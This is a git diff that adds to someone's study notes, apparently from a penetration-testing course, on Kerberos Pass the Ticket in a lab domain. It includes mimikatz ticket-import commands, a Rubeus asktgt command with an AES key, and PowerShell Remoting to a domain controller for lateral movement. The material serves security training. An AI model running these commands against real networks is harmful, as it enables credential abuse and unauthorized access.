@@ -65,3 +65,26 @@ use the Base64 output from Rubeus or convert a .kirbi to Base64 to perform the P
 perform a Pass the Ticket providing the Base64 string instead of the file name.(i also didnt understand why it does both the example  with a string and with the base64)
 
 ## mimikatz - pass the ticket
+```
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+```
+```
+Enter-PSSession -ComputerName DC01
+To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new `cmd.exe` and execute `mimikatz.exe`, then import the ticket we collected using `kerberos::ptt`. Once the ticket is imported into our `cmd.exe` session, we can launch a PowerShell command prompt from the same `cmd.exe` and use the command `Enter-PSSession` to connect to the target machine.
+
+
+## Rubeus - PowerShell Remoting with Pass the Ticket
+```
+ Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+   ______        _
+```Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.
+
+#### Rubeus - Pass the Ticket for lateral movement
+```
+Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+```
+The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.
+```
